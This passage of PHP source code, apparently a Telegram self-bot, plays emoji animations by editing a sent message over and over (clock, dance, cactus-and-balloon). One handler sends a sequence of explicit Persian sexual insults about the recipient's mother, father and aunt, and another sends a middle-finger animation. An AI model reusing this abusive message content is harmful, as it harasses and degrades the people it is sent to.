
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🟦🟦🟦🟦🟦
🟦🟦🟦▫🟦
🟦🟦▫🟦🟦
🟦▫🟦🟦🟦
🟦🟦🟦🟦🟦']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🟪🟪🟪🟪🟪
🟪🟪▫🟪🟪
🟪🟪▫🟪🟪
🟪🟪▫🟪🟪
🟪🟪🟪🟪🟪']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🟫🟫🟫🟫🟫
🟫▫🟫🟫🟫
🟫🟫▫🟫🟫
🟫🟫🟫▫🟫
🟫🟫🟫🟫🟫']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '◻◻◻◻◻
◻◻◻◻◻
◻◾◾◾◻
◻◻◻◻◻
◻◻◻◻◻']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🟥🟥🟥🟥🟥
🟥🟥▫🟥🟥
🟥🟥▫🟥🟥
🟥🟥▫🟥🟥
🟥🟥🟥🟥🟥']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🟥🟥🟥🟥🟥
🟥🟥▫🟥🟥
🟥▫▫▫🟥
🟥🟥▫🟥🟥
🟥🟥🟥🟥🟥']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🟥🟥🟥🟥▫
🟥🟥▫▫🟥
🟥▫▫▫🟥
🟥▫▫🟥🟥
▫🟥🟥🟥🟥']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '▫▫▫▫▫
🟥🟥▫▫🟥
🟥▫▫▫🟥
🟥▫▫🟥🟥
▫▫▫▫▫']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '▫▫▫▫▫
▫▫▫▫▫
▫▫▫▫▫
▫▫▫▫▫
▫▫▫▫▫']);
                    }
                    if ($text == 'ساعت' or $text == 'clock') {
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => '🕛🕛🕛🕛🕛
🕛🕛🕛🕛🕛
🕛🕛🕛🕛🕛
🕛🕛🕛🕛🕛
🕛🕛🕛🕛🕛']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🕐🕐🕐🕐🕐
🕐🕐🕐🕐🕐
🕐🕐🕐🕐🕐
🕐🕐🕐🕐🕐
🕐🕐🕐🕐🕐']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🕑🕑🕑🕑🕑
🕑🕑🕑🕑🕑
🕑🕑🕑🕑🕑
🕑🕑🕑🕑🕑
🕑🕑🕑🕑🕑']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🕒🕒🕒🕒🕒
🕒🕒🕒🕒🕒
🕒🕒🕒🕒🕒
🕒🕒🕒🕒🕒
🕒🕒🕒🕒🕒']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🕔🕔🕔🕔🕔
🕔🕔🕔🕔🕔
🕔🕔🕔🕔🕔
🕔🕔🕔🕔🕔
🕔🕔🕔🕔🕔']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🕕🕕🕕🕕🕕
🕕🕕🕕🕕🕕
🕕🕕🕕🕕🕕
🕕🕕🕕🕕🕕
🕕🕕🕕🕕🕕']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🕖🕖🕖🕖🕖
🕖🕖🕖🕖🕖
🕖🕖🕖🕖🕖
🕖🕖🕖🕖🕖
🕖🕖🕖🕖🕖']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🕗🕗🕗🕗🕗
🕗🕗🕗🕗🕗
🕗🕗🕗🕗🕗
🕗🕗🕗🕗🕗
🕗🕗🕗🕗🕗']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🕙🕙🕙🕙🕙
🕙🕙🕙🕙🕙
🕙🕙🕙🕙🕙
🕙🕙🕙🕙🕙
🕙🕙🕙🕙🕙']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🕚🕚🕚🕚🕚
🕚🕚🕚🕚🕚
🕚🕚🕚🕚🕚
🕚🕚🕚🕚🕚
🕚🕚🕚🕚🕚']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🕛🕛🕛🕛🕛
🕛🕛??🕛🕛
🕛🕛🕛🕛🕛
🕛🕛🕛🕛🕛
🕛🕛🕛🕛🕛']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '⏰⏰⏰⏰⏰']);
                    }
                    /*===============بکنش===============*/
                    if ($text == 'بکنش' or $text == 'کونش بزار') {
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => 'پاون کدر گاییدت']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => 'فاضلاب شمال شرق تهران تو کص ننت']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => 'کیر گراز وحشی تو مادرت']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => 'اونجا که شاعر میگه یه کیر دارم شاه نداره تو ننت']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => 'پایه تختم تو کونت']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => 'کلا کص ننت']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => 'الکی بی دلیل کص ننت']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => 'بابات چه ورقیه']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => 'دست زدم به کون بابات دلم رفت']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => 'به بابات بگو سفید کنه شب میام بکنم']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => 'کص ننت؟']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => 'ایمیل عمتو لطف کن']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => 'کوننده خونه ای که عمت توش پول درمیاره نوشتم رو کیرم']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => 'کص ننت']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => 'کص پدرت']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => 'یه فرزند جدید داری پاون کدر']);
                    }
                    if ($text == 'فاک' or $text == 'fuck') {
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => '🖕🏿🖕🖕🖕🖕🖕']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🖕🖕🏿🖕🖕🖕🖕']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🖕🖕🖕🏿🖕🖕🖕']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🖕🖕🖕🖕🏿🖕🖕']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🖕🖕🖕🖕🖕🏿🖕']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🖕🖕🖕🖕🖕🖕🏿']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🖕🖕🖕🖕🖕🏾🖕']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🖕🖕🖕🖕🏿🖕🖕']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🖕🖕🖕🏿🖕🖕🖕']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🖕🖕🏿🖕🖕🖕🖕']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🖕🏿🖕🖕🖕🖕🖕']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🖕🖕🏿🖕🖕🏿🖕🖕🏿']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🖕🏿🖕🖕🏿🖕🖕🏿🖕']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🖕🖕🖕🖕🖕🖕']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🖕🏿🖕🏿🖕🏿🖕🏿🖕🏿🖕🏿']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '☘fucking you☘']);
                    }
                    if ($text == 'رقص' or $text == 'danc') {
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => '🟥🟥🟥🟥🟥
🟥🟥🟥🟥🟥
🟥🔲🔳🔲🟥
🟥🟥🟥🟥🟥
🟥🟥🟥🟥🟥']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🟥🟥🟥🟥🟥
🟥🟥🔲🟥🟥
🟥🟥🔳🟥🟥
🟥🟥🔲🟥🟥
🟥🟥🟥🟥🟥']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🟥🟥🟥🟥🟥
🟥🟥🟥🔲🟥
🟥🟥🔳🟥🟥
🟥🔲🟥🟥🟥
🟥🟥🟥🟥🟥']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🟥🟥🟥🟥🟥
🟥🔲🟥🟥🟥
🟥🟥🔳🟥🟥
🟥🟥🟥🔲🟥
🟥🟥🟥🟥🟥']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🟪🟪🟪🟪🟪
🟪🟪🟪🟪🟪
🟪🔲🔳🔲🟪
🟪🟪🟪🟪🟪
🟪🟪🟪🟪🟪']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🟪🟪🟪🟪🟪
🟪🟪🔲🟪🟪
🟪🟪🔳🟪🟪
🟪🟪🔲🟪🟪
🟪🟪🟪🟪🟪']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🟪🟪🟪🟪🟪
🟪🟪🟪🔲🟪
🟪🟪🔳🟪🟪
🟪🔲🟪🟪🟪
🟪🟪🟪🟪🟪']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🟪🟪🟪🟪🟪
🟪🔲🟪🟪🟪
🟪🟪🔳🟪🟪
🟪🟪🟪🔲🟪
🟪🟪🟪🟪🟪']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🟦🟦🟦🟦🟦
🟦🟦🟦🟦🟦
🟦🔲🔳🔲🟦
🟦🟦🟦🟦🟦
🟦🟦🟦🟦🟦']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🟦🟦🟦🟦🟦
🟦🟦🔲🟦🟦
🟦🟦🔳🟦🟦
🟦🟦🔲🟦🟦
🟦🟦🟦🟦🟦']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🟦🟦🟦🟦🟦
🟦🟦🟦🔲🟦
🟦🟦🔳🟦🟦
🟦🔲🟦🟦🟦
🟦🟦🟦🟦🟦']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🟦🟦🟦🟦🟦
🟦🔲🟦🟦🟦
🟦🟦🔳🟦🟦
🟦🟦🟦🔲🟦
🟦🟦🟦🟦🟦']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '◻️🟩🟩◻️◻️
◻️◻️🟩◻️🟩
🟩🟩🔳🟩🟩
🟩◻️🟩◻️◻️
◻️◻️🟩🟩◻️']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🟩⬜️⬜️🟩🟩
🟩🟩⬜️🟩⬜️
⬜️⬜️🔲⬜️⬜️
⬜️🟩⬜️🟩🟩
🟩🟩⬜️⬜️🟩']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '▫️▫️▫️▫️▫️
▫️▫️▫️▫️▫️
▫️▫️▫️▫️▫️
▫️▫️▫️▫️▫️
▫️▫️▫️▫️▫️']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '☘تـــــــــــــــامـــــــــــام☘']);
                    }
                    if ($text == 'خار' or $text == 'کاکتوس') {
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => '🌵ــــــــــــــــــــــــــــــــــــــــ 🎈']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🌵ــــــــــــــــــــــــــــــــــــــــ🎈']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🌵ـــــــــــــــــــــــــــــــــــــــ🎈']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🌵ــــــــــــــــــــــــــــــــــــــ🎈']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🌵ـــــــــــــــــــــــــــــــــــــ🎈']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🌵ــــــــــــــــــــــــــــــــــــ🎈']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🌵ـــــــــــــــــــــــــــــــــــ🎈']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🌵ــــــــــــــــــــــــــــــــــ🎈']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🌵ـــــــــــــــــــــــــــــــــ🎈']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🌵ــــــــــــــــــــــــــــــــ🎈']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🌵ـــــــــــــــــــــــــــــــ🎈']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🌵ــــــــــــــــــــــــــــــ🎈']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🌵ـــــــــــــــــــــــــــــ🎈']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🌵ــــــــــــــــــــــــــــ🎈']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🌵ــــــــــــــــــــــــــ🎈']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🌵ـــــــــــــــــــــــــ🎈']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🌵ــــــــــــــــــــــ🎈']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🌵ـــــــــــــــــــــ🎈']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🌵ـــــــــــــــــــ🎈']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🌵ـــــــــــــــــ🎈']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🌵ـــــــــــــــ🎈']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🌵ــــــــــــ🎈']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🌵ــــــــــ🎈']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🌵ـــــــــ🎈']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🌵ــــــــ🎈']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🌵ــــــ🎈']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🌵ــــ🎈']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🌵ـــ🎈']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🌵ــ🎈']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🌵ـ🎈']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🌵💥🎈']);
                        yield
                        $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '💥Bommmm💥']);
                    }
                    if ($text == 'رقص مربع' or $text == 'دنس') {
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => '🟥🟥🟥🟥🟥🟥🟥🟥🟥
🟥🟥🟥🟥🟥🟥🟥🟥🟥
🟥🟥🟥🟥🟥🟥🟥🟥🟥
🟥🟥🟥🟥🟥🟥🟥🟥🟥
🟥🟥🟥🟥🟥🟥🟥🟥🟥
🟥🟥🟥🟥🟥🟥🟥🟥🟥
🟥🟥🟥🟥🟥🟥🟥🟥🟥
🟥🟥🟥🟥🟥🟥🟥🟥🟥
🟥🟥🟥🟥🟥🟥🟥🟥🟥']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🟧🟧🟧🟧🟧🟧🟧🟧🟧
🟥🟥🟥🟥🟥🟥🟥🟥🟥
🟥🟥🟥🟥🟥🟥🟥🟥🟥
🟥🟥🟥🟥🟥🟥🟥🟥🟥
🟥🟥🟥🟥🟥🟥🟥🟥🟥
🟥🟥🟥🟥🟥🟥🟥🟥🟥
🟥🟥🟥🟥🟥🟥🟥🟥🟥
🟥🟥🟥🟥🟥🟥🟥🟥🟥
🟥🟥🟥🟥🟥🟥🟥🟥🟥']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🟧🟧🟧🟧🟧🟧🟧🟧🟧
🟧🟧🟧🟧🟧🟧🟧🟧🟧
🟥🟥🟥🟥🟥🟥🟥🟥🟥
🟥🟥🟥🟥🟥🟥🟥🟥🟥
🟥🟥🟥??🟥🟥??🟥🟥
🟥🟥🟥🟥🟥🟥??🟥🟥
🟥🟥🟥🟥🟥🟥🟥🟥🟥
🟥🟥🟥🟥🟥🟥🟥🟥🟥
🟥🟥🟥🟥🟥🟥🟥🟥🟥']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🟧🟧🟧🟧🟧🟧🟧🟧🟧
🟧🟧🟧🟧🟧🟧🟧🟧🟧
🟧🟧🟧🟧🟧🟧🟧🟧🟧
🟥🟥🟥🟥🟥🟥🟥🟥🟥
🟥🟥🟥🟥🟥🟥🟥🟥🟥
🟥🟥🟥🟥🟥🟥🟥🟥🟥
🟥🟥🟥🟥🟥🟥🟥🟥🟥
🟥🟥🟥🟥🟥🟥🟥🟥🟥
🟥🟥🟥🟥🟥🟥🟥🟥🟥']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🟧🟧🟧🟧🟧🟧🟧🟧🟧
🟧🟧🟧🟧🟧🟧🟧🟧🟧
🟧🟧🟧🟧🟧🟧🟧🟧🟧
🟧🟧🟧🟧🟧🟧🟧🟧🟧
🟥🟥🟥🟥🟥🟥🟥🟥🟥
🟥🟥🟥🟥🟥🟥🟥🟥🟥
🟥🟥🟥🟥🟥🟥🟥🟥🟥
🟥🟥🟥🟥🟥🟥🟥🟥🟥
🟥🟥🟥🟥🟥🟥🟥🟥🟥']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🟧🟧🟧🟧🟧🟧🟧🟧🟧
🟧🟧🟧🟧🟧🟧🟧🟧🟧
🟧🟧🟧🟧🟧🟧🟧🟧🟧
🟧🟧🟧🟧🟧🟧🟧🟧🟧
🟧🟧🟧🟧🟧🟧🟧🟧🟧
🟥🟥🟥🟥🟥🟥🟥🟥🟥
🟥🟥🟥🟥🟥🟥🟥🟥🟥
🟥🟥🟥🟥🟥🟥🟥🟥🟥
🟥🟥🟥🟥🟥🟥🟥🟥🟥']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🟧🟧🟧🟧🟧🟧🟧🟧🟧
🟧🟧🟧🟧🟧🟧🟧🟧🟧
🟧🟧🟧🟧🟧🟧🟧🟧🟧
🟧🟧🟧🟧🟧🟧🟧🟧🟧
🟧🟧🟧🟧🟧🟧🟧🟧🟧
🟧🟧🟧🟧🟧🟧🟧🟧🟧
🟥🟥🟥🟥🟥🟥🟥🟥🟥
🟥🟥🟥🟥🟥🟥🟥🟥🟥
🟥🟥🟥🟥🟥🟥🟥🟥🟥']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🟧🟧🟧🟧🟧🟧🟧🟧🟧
🟧🟧🟧🟧🟧🟧🟧🟧🟧
🟧🟧🟧🟧🟧🟧🟧🟧🟧
🟧🟧🟧🟧🟧🟧🟧🟧🟧
🟧🟧🟧🟧🟧🟧🟧🟧🟧
🟧🟧🟧🟧🟧🟧🟧🟧🟧
🟧🟧🟧🟧🟧🟧🟧🟧🟧
🟥🟥🟥🟥🟥🟥🟥🟥🟥
🟥🟥🟥🟥🟥🟥🟥🟥🟥']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🟧🟧🟧🟧🟧🟧🟧🟧🟧
🟧🟧🟧🟧🟧🟧🟧🟧🟧
🟧🟧🟧🟧🟧🟧🟧🟧🟧
🟧🟧🟧🟧🟧🟧🟧🟧🟧
🟧🟧🟧🟧🟧🟧🟧🟧🟧
🟧🟧🟧🟧🟧🟧🟧🟧🟧
🟧🟧🟧🟧🟧🟧🟧🟧🟧
🟧🟧🟧🟧🟧🟧🟧🟧🟧
🟥🟥🟥🟥🟥🟥🟥🟥🟥']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🟧🟧🟧🟧🟧🟧🟧🟧🟧
🟧🟧🟧🟧🟧🟧🟧🟧🟧
🟧🟧🟧🟧🟧🟧🟧🟧🟧
🟧🟧🟧🟧🟧🟧🟧🟧🟧
🟧🟧🟧🟧🟧🟧🟧🟧🟧
🟧🟧🟧🟧🟧🟧🟧🟧🟧
🟧🟧🟧🟧🟧🟧🟧🟧🟧
🟧🟧🟧🟧🟧🟧🟧🟧🟧
🟧🟧🟧🟧🟧🟧🟧🟧🟧']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🟧🟧🟧🟧🟧🟧🟧🟧🟧
🟧🟧🟧🟧🟧🟧🟧🟧🟧
🟧🟧🟧🟧🟧🟧🟧🟧🟧
🟧🟧🟧🟧🟧🟧🟧🟧🟧
🟧🟧🟧🟧🟧🟧🟧🟧🟧
🟧🟧🟧🟧🟧🟧🟧🟧🟧
🟧🟧🟧🟧🟧🟧🟧🟧🟧
🟧🟧🟧🟧🟧🟧🟧🟧🟧
🟥🟥🟥🟥🟥🟥🟥🟥🟥']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🟧🟧🟧🟧🟧🟧🟧🟧🟧
🟧🟧🟧🟧🟧🟧🟧🟧🟧
🟧🟧🟧🟧🟧🟧🟧🟧🟧
🟧🟧🟧🟧🟧🟧🟧🟧🟧
🟧🟧🟧🟧🟧🟧🟧🟧🟧
🟧🟧🟧🟧🟧🟧🟧🟧🟧
🟧🟧🟧🟧🟧🟧🟧🟧🟧
🟥🟥🟥🟥🟥🟥🟥🟥🟥
🟥🟥🟥🟥🟥🟥🟥🟥🟥']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🟧🟧🟧🟧🟧🟧🟧🟧🟧
🟧🟧🟧🟧🟧🟧🟧🟧🟧
🟧🟧🟧🟧🟧🟧🟧🟧🟧
🟧🟧🟧🟧🟧🟧🟧🟧🟧
🟧🟧🟧🟧🟧🟧🟧🟧🟧
🟧🟧🟧🟧🟧🟧🟧🟧🟧
🟥🟥🟥🟥🟥🟥🟥🟥🟥
🟥🟥🟥🟥🟥🟥🟥🟥🟥
🟥🟥🟥🟥🟥🟥🟥🟥🟥']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🟧🟧🟧🟧🟧🟧🟧🟧🟧
🟧🟧🟧🟧🟧🟧🟧🟧🟧
🟧🟧🟧🟧🟧🟧🟧🟧🟧
🟧🟧🟧🟧🟧🟧🟧🟧🟧
🟧🟧🟧🟧🟧🟧🟧🟧🟧
🟥🟥🟥🟥🟥🟥🟥🟥🟥
🟥🟥🟥🟥🟥🟥🟥🟥🟥
🟥🟥🟥🟥🟥🟥🟥🟥🟥
🟥🟥🟥🟥🟥🟥🟥🟥🟥']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🟧🟧🟧🟧🟧🟧🟧🟧🟧
🟧🟧🟧🟧🟧🟧🟧🟧🟧
🟧🟧🟧🟧🟧🟧🟧🟧🟧
??🟧🟧🟧🟧🟧🟧🟧🟧
🟥🟥🟥🟥🟥🟥🟥🟥🟥
🟥🟥🟥🟥🟥🟥🟥🟥🟥
🟥🟥🟥🟥🟥🟥🟥🟥🟥
🟥🟥🟥🟥🟥🟥🟥🟥🟥
🟥🟥🟥🟥🟥🟥🟥🟥🟥']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🟧🟧🟧🟧🟧🟧🟧🟧🟧
🟧🟧🟧🟧🟧🟧🟧🟧🟧
🟧🟧🟧🟧🟧🟧🟧🟧🟧
🟥🟥🟥🟥🟥🟥🟥🟥🟥
🟥🟥🟥🟥🟥🟥🟥🟥🟥
🟥🟥🟥🟥🟥🟥🟥🟥🟥
🟥🟥🟥🟥🟥🟥🟥🟥🟥
🟥🟥🟥🟥🟥🟥🟥🟥🟥
🟥🟥🟥🟥🟥🟥🟥🟥🟥']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🟧🟧🟧🟧🟧🟧🟧🟧🟧
🟧🟧🟧🟧🟧🟧🟧🟧🟧
🟥🟥🟥🟥🟥🟥🟥🟥🟥
🟥🟥🟥🟥🟥🟥🟥🟥🟥
🟥🟥🟥🟥🟥🟥🟥🟥🟥
🟥🟥🟥🟥🟥🟥🟥🟥🟥
🟥🟥🟥🟥🟥🟥🟥🟥🟥
🟥🟥🟥🟥🟥🟥🟥🟥🟥
🟥🟥🟥🟥🟥🟥🟥🟥🟥']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🟧🟧🟧🟧🟧🟧🟧🟧🟧
🟥🟥🟥🟥🟥🟥🟥🟥🟥
🟥🟥🟥🟥🟥🟥🟥🟥🟥
🟥🟥🟥🟥🟥🟥🟥🟥🟥
🟥🟥🟥🟥🟥🟥🟥🟥🟥
🟥🟥🟥🟥🟥🟥🟥🟥🟥
🟥🟥🟥🟥🟥🟥🟥🟥🟥
🟥🟥🟥🟥🟥🟥🟥🟥🟥
🟥🟥🟥🟥🟥🟥🟥🟥🟥']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🟥🟥🟥🟥🟥🟥🟥🟥🟥
🟥🟥🟥🟥🟥🟥🟥🟥🟥
🟥🟥🟥🟥🟥🟥🟥🟥🟥
🟥🟥🟥🟥🟥🟥🟥🟥🟥
🟥🟥🟥🟥🟥🟥🟥🟥🟥
🟥🟥🟥🟥🟥🟥🟥🟥🟥
🟥🟥🟥🟥🟥🟥🟥🟥🟥
🟥🟥🟥🟥🟥🟥🟥🟥🟥
🟥🟥??🟥🟥🟥🟥🟥🟥']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🟧🟧🟧🟧🟧🟧🟧🟧🟧
🟧🟧🟧🟧🟧🟧🟧🟧🟧
🟧🟧🟧🟧🟧🟧🟧🟧🟧
🟧🟧🟧🟧🟧🟧🟧🟧🟧
🟧🟧🟧🟧🟧🟧🟧🟧🟧
🟧🟧🟧🟧🟧🟧🟧🟧🟧
🟧🟧🟧🟧🟧🟧🟧🟧🟧
🟧🟧🟧🟧🟧🟧🟧🟧🟧
🟧🟧🟧🟧🟧🟧🟧🟧🟧']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🟧🟧🟧🟧🟧🟧🟧🟧🟧
🟧🟧🟧🟧🟧🟧🟧🟧🟧
🟧🟧🟧🟧🟧🟧🟧🟧🟧
🟧🟧🟧🟧🟧🟧🟧🟧🟧
🟧🟧🟧🟧🟪🟧🟧🟧🟧
🟧🟧🟧🟧🟧🟧🟧🟧🟧
🟧🟧🟧🟧🟧🟧🟧🟧🟧
